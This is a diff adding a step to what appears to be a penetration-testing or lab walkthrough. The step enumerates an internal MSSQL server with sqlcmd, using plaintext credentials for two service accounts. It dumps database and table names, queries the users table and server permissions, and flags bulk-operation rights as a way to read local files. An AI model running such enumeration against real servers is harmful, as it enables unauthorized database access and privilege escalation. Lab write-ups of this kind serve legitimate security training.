@@ -1534,3 +1534,73 @@ sudo nmap --open -iL scope
 5985/tcp open  wsman
 ```
 {% endcode %}
+
+<mark style="color:blue;">**Step 9**</mark>&#x20;
+
+**Pentesting MSSQL**
+
+{% code overflow="wrap" %}
+```bash
+sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT name FROM sys.databases; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT * FROM users;"
+
+master
+tempdb
+model
+msdb
+aegis
+aegis_audit
+
+user_sessions
+users
+webauthn_credentials
+webauthn_challenges
+templates
+render_diagnostics
+mds_diag_audit
+
+sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "select @@version;"
+
+Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
+
+
+sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+
+server              CONNECT SQL                                                                                                                                                                                                                           
+server               VIEW ANY DATABASE                                                                                                                                                                                                                                              
+
+
+sqlcmd -S 172.16.0.11,1433 -U odyssey_app -P 'opc0932k90%%lODFI93-++' -d aegis -C -Q "SELECT srvname, isremote FROM sysservers"
+
+odyssey-db   is remote : 1
+
+# Server 'odyssey-db' is not configured for DATA ACCESS.
+```
+{% endcode %}
+
+**i tried to modify this but am not sysadmin and also i tried i tried everything but nothing including read local file so we try the audit user**
+
+{% code overflow="wrap" %}
+```bash
+sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "SELECT name FROM sys.databases; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; SELECT * FROM users;"
+
+master
+tempdb
+model
+msdb
+aegis
+aegis_audit
+
+signed_artifact_attestations
+notice_render_attestations
+audit_ingest_staging
+
+sqlcmd -S 172.16.0.11,1433 -U aegis_audit_publisher -P 'Rxd!Qw6n8sP..2bJ@Wpx-2026' -d aegis_audit -C -Q "SELECT * FROM fn_my_permissions(NULL, 'SERVER');"
+entity_name
+
+server           CONNECT SQL                                                                                                                                                                                                                                                  
+server           ADMINISTER BULK OPERATIONS                                                                                                                                                                                                                                                 
+server           VIEW ANY DATABASE                                                                                                                                                                                                                                                 
+
+# its interesting we have bulk permissions we can read local files
+```
+{% endcode %}
